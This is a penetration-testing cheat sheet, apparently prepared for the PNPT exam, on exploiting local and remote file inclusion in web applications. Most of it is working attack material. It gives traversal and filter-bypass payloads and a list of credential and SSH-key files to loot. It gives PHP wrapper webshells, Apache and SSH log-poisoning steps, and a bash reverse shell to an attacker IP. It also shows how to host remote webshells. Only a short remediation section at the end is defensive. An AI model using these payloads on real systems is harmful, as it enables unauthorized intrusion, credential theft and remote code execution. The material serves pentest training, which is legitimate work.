# File Inclusion (LFI / RFI)

The app builds a file path or an `include()` target from your input. Point it at files it shouldn't serve to read source and secrets (LFI), or at a remote file you control to run your code (RFI). On the PNPT web assessment this is a top source-disclosure-to-RCE chain — hunt any parameter that looks like it names a file (`page`, `file`, `include`, `template`, `view`, `path`, `load`), which you flagged during [Web Enumeration](web-enumeration.md).

{% hint style="warning" %}
Reading `/etc/passwd` proves traversal. It does **not** prove much impact on its own. For the report, escalate to source/credential disclosure you reused, or to a shell via log poisoning, a PHP wrapper, or RFI. The `passwd` read is the bug; the config secret or the shell is the finding.
{% endhint %}

## LFI — read local files

### Basic payloads

```
?file=index.php
?file=../../../../etc/passwd
?file=/etc/passwd
?file=....//....//....//etc/passwd
```

Windows targets:

```
?file=..\..\..\windows\system32\drivers\etc\hosts
?file=C:\Windows\win.ini
```

### Traversal-filter bypass

```
%2e%2e%2f              ../  URL-encoded (baseline)
%252e%252e%252f        ../  double URL-encoded
..%c0%af               ../  UTF-8 overlong (old GlassFish, etc.)
..%2f / ..%5c          ../  and ..\  encoded slashes
....//                 ../  filter that runs str_replace('..','') once
..;/                   ../  Tomcat semicolon quirk
../../etc/passwd%00    ../  null-byte terminator (PHP < 5.3)
```

{% hint style="info" %}
Some server-side traversal bugs need the literal `../` to survive to the server. HTTP clients normalize it away first. Force curl to send it raw with `--path-as-is`; Python `requests` always normalizes (drop to `urllib`), and `urllib` does not.
{% endhint %}

```bash
curl --path-as-is "http://<TARGET>:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
curl "http://<TARGET>:3000/..%2f..%2f..%2f..%2fetc%2fpasswd"   # encoded variant survives any client
```

### High-value files to read

**Linux**

```
/etc/passwd                    # users (and a hint at home dirs)
/etc/shadow                    # hashes (root-readable only)
/var/www/html/config.php       # app DB creds
/var/www/html/wp-config.php    # WordPress DB creds
.env                           # framework secrets / DB creds
/home/<user>/.ssh/id_rsa       # SSH private key -> direct login
/root/.bash_history            # commands (often creds)
/proc/self/environ             # env vars, sometimes SECRET_KEY / DB creds
/proc/self/cmdline             # exact argv — often leaks CLI passwords
/var/log/apache2/access.log    # log-poisoning target
/var/log/auth.log              # SSH log-poisoning target
```

**Windows**

```
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\config\SAM
C:\Windows\win.ini
```

### `/proc/self/*` enumeration (Python / Node / Ruby apps)

When the app isn't PHP, use `/proc` symlinks to read source and leak process secrets without guessing paths.

| Path | What it gives you |
| --- | --- |
| `/proc/self/cwd/app.py` | Source via the cwd symlink |
| `/proc/self/cmdline` | Exact argv (null-separated) — leaks CLI passwords |
| `/proc/self/environ` | Env vars — `SECRET_KEY` / DB creds |
| `/proc/self/exe` | Interpreter path |
| `/proc/<PID>/cmdline` | Any running process (find PIDs via `/proc/*/comm`) |

```bash
curl -s "http://<TARGET>:3000/..%2f..%2f..%2f..%2fproc%2fself%2fcmdline" | tr '\0' ' '
# -> /usr/local/bin/some-web -u admin -p SuperSecretPass123
```

## PHP wrappers — read source, then run code

### `php://filter` — disclose PHP source without executing it

A plain include of a `.php` file executes it; the base64 filter returns the source instead.

```bash
curl "http://<TARGET>/?page=php://filter/convert.base64-encode/resource=index"
curl "http://<TARGET>/?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php"
# Decode:
curl -s "http://<TARGET>/?page=php://filter/convert.base64-encode/resource=config" \
  | grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d
```

Chain filters to defeat naive blacklists (WAF drops the literal `convert.base64-encode`, or a `<?php` byte-scanner watches the output):

```
# ROT13 the source (less common blocklist target)
?page=php://filter/read=string.rot13/resource=index.php

# UTF-16LE — doubles every byte, breaks a "<?php" byte-scan
?page=php://filter/convert.iconv.utf-8.utf-16le/resource=index.php

# Chain: rot13 then base64
?page=php://filter/read=string.rot13|convert.base64-encode/resource=index.php

# zlib deflate then base64
?page=php://filter/zlib.deflate|convert.base64-encode/resource=index.php
```

Parameters worth testing for a wrapper: `?debug=`, `?file=`, `?page=`, `?template=`, `?view=`, `?load=`, `?include=`, `?path=`.

### `data://` — inline RCE, no disk write (needs `allow_url_include=On`)

```
# <?php system($_GET['cmd']); ?>  base64-encoded
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

# raw form
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
```

Confirm the sink is `include()` (RFI-capable) and not `readfile()` first — dump its source with the base64 filter and look for `include($x)`:

```bash
curl -G "http://<TARGET>/image.php" \
  --data-urlencode "img=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==" \
  --data-urlencode "c=id"
# base64 = <?php system($_GET['c']); ?>
```

{% hint style="info" %}
`$_GET` webshell returning HTTP 500? `curl --data-urlencode` alone puts data in the POST body, so `$_GET` stays empty. Force the query string with `curl -G`. And if PHP kills your reverse shell at `max_execution_time`, wrap it in `setsid ... &` to detach it from the request's process group.
{% endhint %}

### `input://` and `expect://`

```
?file=php://input        # POST body: <?php system($_GET['cmd']); ?>  then ?cmd=id
?file=expect://id         # if the expect extension is loaded
```

### `phar://` and `zip://` — pair with a file upload

```bash
# zip a shell disguised as an image, upload it, then include the entry
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
# ?page=zip://uploads/shell.jpg%23shell.php&cmd=id

# phar deserialization RCE
# ?page=phar://uploads/evil.jpg/test.txt
```

### `pearcmd.php` (PHP 7.4+, `register_argc_argv` on)

```
?page=/usr/share/php/pearcmd.php&+config-create+/&/<?=system($_GET['cmd'])?>+/tmp/shell.php
# then: /tmp/shell.php?cmd=id
```

## LFI to RCE — log & session poisoning

When you can only read (no wrapper RCE), plant PHP into a file the app will include, then include it.

### Apache access-log poisoning

```bash
# 1. Poison: put PHP in a header that gets logged
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>/

# 2. Include the log + supply the command
curl "http://<TARGET>/page?file=/var/log/apache2/access.log&cmd=id"
```

One-shot reverse shell via a poisoned log — poison a header-reading stub, then trigger with a custom header so it survives shell + URL mangling:

```bash
curl -A "<?php system(\$_SERVER['HTTP_X_CMD']); ?>" http://<TARGET>/
curl -H "X-Cmd: bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" \
     "http://<TARGET>/page?file=/var/log/apache2/access.log"
```

### SSH auth-log poisoning

```bash
ssh '<?php system($_GET["cmd"]); ?>'@<TARGET>   # username lands in /var/log/auth.log
# then: ?file=/var/log/auth.log&cmd=id
```

### PHP session poisoning

```
# Sessions live in /var/lib/php/sessions/sess_<PHPSESSID>
# 1. Get the app to store your PHP payload in a session value
# 2. Include your own session file:
?file=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

### /proc/self/environ

```
# Poison via User-Agent: <?php system($_GET['cmd']); ?>
?page=../../../proc/self/environ&cmd=id
```

## RFI — include your own remote file (needs `allow_url_include=On`)

```
?file=http://<ATTACKER_IP>/shell.php
?file=http://<ATTACKER_IP>/shell.txt
?file=ftp://<ATTACKER_IP>/shell.php
?file=//<ATTACKER_IP>/shell.php
```

Host it:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8080
```

## Ready-made webshells (skip writing your own)

Kali ships ~60 webshells covering every language you'll meet:

```bash
ls /usr/share/webshells/           # asp aspx cfm jsp perl php
ls /usr/share/webshells/php/       # php-reverse-shell.php simple-backdoor.php ...
# Patch a reverse shell hot:
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
sed -i "s/127.0.0.1/<ATTACKER_IP>/;  s/1234/4444/" shell.php
```

Also under `/usr/share/laudanum/` (HTA/JSP/PHP/ASPX collection).

## Notable traversal chains you'll actually hit

**`....//` when `..` is stripped once.** `str_replace('..','',...)` runs before the doubled slash collapses:

```bash
curl "http://<TARGET>/index.php?page=....//....//....//....//etc/passwd"
curl "http://<TARGET>/index.php?page=....//....//....//....//home/user/.ssh/id_rsa"
```

**Auto-suffix `.php` on the parameter?** `/etc/passwd` fails, but `php://filter` overrides the suffix and still dumps source; then upload a zip and reach it via `zip://`:

```bash
curl -s "http://<TARGET>/index.php?file=php://filter/convert.base64-encode/resource=upload" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | base64 -d
```

**Apache-proxy path normalization to a restricted Tomcat `/manager`.** Apache resolves `..;/` and strips the access check; Tomcat treats it literally and still routes:

```bash
curl "http://<TARGET>/manager/html"              # 403 Forbidden
curl "http://<TARGET>/actuator/..;/manager/html" # 200 OK — manager login
curl "http://<TARGET>/examples/..;/manager/html"
curl "http://<TARGET>/%2e%2e;/manager/html"      # encoded dot-dot
```

**Filename traversal on upload becomes read via a DB round-trip.** Even if the write fails, the stored path may be re-served by a `/download/<id>` endpoint:

```
POST /upload
Content-Disposition: form-data; name="file"; filename="../../../../../etc/passwd"
```

Always look for the `/download`, `/view`, `/serve`, `/file` counterpart to any upload that accepts unsanitized filenames.

## Detection

```bash
# Manual
curl "http://<TARGET>/page?file=../../../../etc/passwd"

# Fuzz the parameter with a traversal/path wordlist
ffuf -u "http://<TARGET>/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
# Or drive Burp Intruder with file-path payloads
```

Read the response signals: a 404 or blank page means wrong path; PHP syntax errors mean a non-PHP file got included; command output means LFI+RCE is live.

## Exploitation workflow

```bash
# 1. Find the inclusion parameter (page/file/include/template/view/path) - see Web Enumeration
# 2. Confirm traversal with ../../../etc/passwd; if blocked, cycle the bypass table
# 3. Fingerprint the stack:
#      PHP     -> php://filter to dump source, then data:// or log poison for RCE
#      Py/Node -> /proc/self/* to read source and leak env creds
# 4. Loot: read config/.env/wp-config for DB and app creds; read id_rsa for SSH
# 5. Escalate to a shell: log poisoning, PHP wrapper, or RFI
# 6. Catch the shell and prove impact
python3 -m http.server 80   # host RFI payloads / catch OOB reads
```

## Prove impact, don't just read `/etc/passwd`

For the [report](report-writing.md), show the real consequence: database or framework credentials you pulled from a config file and reused, an SSH private key that logged you in, or a reverse shell from a poisoned log or a `data://` wrapper. `/etc/passwd` proves the traversal; the reused secret or the shell proves the finding and sets the severity.

## Fix guidance (for the remediation section)

* **Don't build include paths from user input.** Map a fixed allowlist of page identifiers to server-side filenames; reject anything not on the list.
* **Canonicalize and confine.** Resolve the requested path and verify it stays inside the intended directory (`basename()`, realpath checks); strip `../`, null bytes, and wrapper schemes.
* **Disable remote/dangerous features in `php.ini`**: `allow_url_include = Off`, `allow_url_fopen = Off`, and unregister risky wrappers.
* **Least privilege**: the web user can't read `/etc/shadow`, SSH keys, or other users' files; keep logs out of the web-readable/includable path.

## Related

* [Web Enumeration](web-enumeration.md) — find the file-naming parameters first
* [HTTP Attacks](http-attacks.md) · [SQL Injection](sql-injection.md) · [Command Injection](command-injection.md) · [File Upload](file-upload.md)
* [Cross-Site Scripting](xss.md) — client-side injection on the same mapped inputs
* [Server-Side Attacks](server-side-attacks.md) — SSRF and deserialization that pair with wrappers and traversal
* [Report Writing](report-writing.md) — turning a config-file read into a rated finding
